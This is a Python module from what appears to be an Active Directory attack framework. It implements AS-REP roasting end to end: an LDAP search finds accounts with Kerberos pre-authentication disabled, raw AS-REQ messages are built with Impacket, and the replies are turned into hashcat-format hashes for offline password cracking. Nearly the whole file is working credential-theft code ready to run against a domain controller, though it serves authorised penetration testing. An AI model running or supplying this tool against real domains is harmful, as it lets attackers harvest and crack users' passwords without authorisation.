"""AS-REP roasting capability (Impacket-backed, hashcat format).

Uses shared ldap_connect for enumeration; roasting itself is unauthenticated
AS-REQ traffic to the KDC.
"""

from __future__ import annotations

import json
from typing import Any, cast

from ldap3 import SUBTREE
from rich.console import Console

from adaf_attack.core.auth import describe_auth
from adaf_attack.core.graph import AttackGraph
from adaf_attack.core.ldap_util import ldap_connect
from adaf_attack.core.redaction import redact
from adaf_attack.core.registry import register_capability
from adaf_attack.core.session import Session
from adaf_attack.core.target import Target

console = Console()


@register_capability(
    id="asrep-roast",
    summary="Identify and roast accounts that do not require pre-authentication",
    category="credential-access",
    tags=("kerberos", "asrep", "preauth"),
    auth_modes=("anonymous",),
    noise_level="low",
    data_sensitivity="credential-material",
)
class AsrepRoast:
    def run(
        self,
        target: Target,
        session: Session,
        graph: AttackGraph,
        *,
        include_secrets: bool = False,
        force: bool = False,
        **kwargs: Any,
    ) -> dict[str, Any]:
        try:
            import datetime
            import random

            from impacket.krb5 import constants
            from impacket.krb5.asn1 import AS_REQ, KERB_PA_PAC_REQUEST
            from impacket.krb5.kerberosv5 import sendReceive
            from impacket.krb5.types import KerberosTime
            from pyasn1.codec.der import decoder, encoder
            from pyasn1.type.univ import noValue
        except ImportError as exc:
            raise RuntimeError(
                "AS-REP roasting requires Impacket. Install with: pip install 'adaf-attack[kerberos]'"
            ) from exc

        console.print(f"[bold]AS-REP Roast[/bold] → {target.domain} @ {target.dc_ip}")
        console.print(f"[dim]Auth (LDAP enum): {describe_auth(target)}[/dim]")

        conn, base_dn, _config = ldap_connect(target)
        conn.search(
            base_dn,
            "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
            search_scope=SUBTREE,
            attributes=["sAMAccountName", "userAccountControl"],
        )

        candidates = []
        for entry in conn.entries:
            sam = str(entry.sAMAccountName)
            candidates.append(sam)
            user_id = f"USER@{sam.upper()}@{target.domain.upper()}"
            graph.add_node(user_id, "User", sam=sam, dont_req_preauth=True)
            graph.add_edge(user_id, user_id, "CanASREP")

        conn.unbind()
        console.print(f"Found [cyan]{len(candidates)}[/cyan] AS-REP roastable accounts")

        roasted = []
        hash_lines: list[str] = []

        for sam in candidates:
            try:
                domain = target.domain.upper()

                as_req = AS_REQ()
                as_req["pvno"] = 5
                as_req["msg-type"] = int(constants.ApplicationTagNumbers.AS_REQ.value)
                pac_request = KERB_PA_PAC_REQUEST()
                pac_request["include-pac"] = True
                encoded_pac = encoder.encode(pac_request)
                as_req["padata"] = noValue
                as_req["padata"][0] = noValue
                as_req["padata"][0]["padata-type"] = int(
                    constants.PreAuthenticationDataTypes.PA_PAC_REQUEST.value
                )
                as_req["padata"][0]["padata-value"] = encoded_pac

                req_body = noValue
                as_req["req-body"] = req_body
                as_req["req-body"]["kdc-options"] = constants.encodeFlags(
                    [constants.KDCOptions.forwardable.value, constants.KDCOptions.renewable.value]
                )
                as_req["req-body"]["sname"] = noValue
                as_req["req-body"]["sname"]["name-type"] = int(
                    constants.PrincipalNameType.NT_SRV_INST.value
                )
                as_req["req-body"]["sname"]["name-string"][0] = "krbtgt"
                as_req["req-body"]["sname"]["name-string"][1] = domain
                as_req["req-body"]["realm"] = domain
                as_req["req-body"]["cname"] = noValue
                as_req["req-body"]["cname"]["name-type"] = int(
                    constants.PrincipalNameType.NT_PRINCIPAL.value
                )
                as_req["req-body"]["cname"]["name-string"][0] = sam

                now = datetime.datetime.now(datetime.UTC)
                as_req["req-body"]["till"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
                as_req["req-body"]["rtime"] = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
                as_req["req-body"]["nonce"] = random.getrandbits(31)
                as_req["req-body"]["etype"][0] = int(
                    constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value
                )
                as_req["req-body"]["etype"][1] = int(
                    constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value
                )
                as_req["req-body"]["etype"][2] = int(constants.EncryptionTypes.rc4_hmac.value)

                raw = encoder.encode(as_req)
                response = sendReceive(raw, domain, target.dc_ip)

                from impacket.krb5.asn1 import AS_REP

                as_rep, _ = decoder.decode(response, asn1Spec=AS_REP())
                enc_part = as_rep["enc-part"]
                etype = int(enc_part["etype"])
                cipher = bytes(enc_part["cipher"])

                hashcat_line = (
                    f"$krb5asrep${etype}${sam}@{domain}:{cipher[:16].hex()}${cipher[16:].hex()}"
                )
                hash_lines.append(hashcat_line)

                roasted.append(
                    {
                        "account": sam,
                        "hash": hashcat_line,
                        "format": f"hashcat-18200-etype{etype}",
                        "etype": etype,
                    }
                )
                console.print(f"  [green]✓[/green] {sam}  etype={etype}")
            except Exception as exc:
                console.print(f"  [red]✗[/red] {sam}  ({exc})")
                roasted.append({"account": sam, "error": str(exc)})

        result = {
            "domain": target.domain,
            "count": len(roasted),
            "tickets": roasted,
        }

        redacted = redact(result, include_secrets=include_secrets)
        out_path = session.path("asrep-roast.json")
        out_path.write_text(json.dumps(redacted, indent=2, default=str), encoding="utf-8")

        if include_secrets and hash_lines:
            hashes_path = session.path("asrep-roast.hashes.txt")
            hashes_path.write_text("\n".join(hash_lines) + "\n", encoding="utf-8")
            console.print(f"Hashcat file → {hashes_path}")

        graph.save(session.path("graph.json"))
        session.log("asrep-roast.complete", count=len(roasted), include_secrets=include_secrets)
        console.print(f"Results → {out_path}")
        if not include_secrets:
            console.print("[dim]Hashes redacted. Use --include-secrets to keep them.[/dim]")
        return cast(dict[str, Any], redacted)
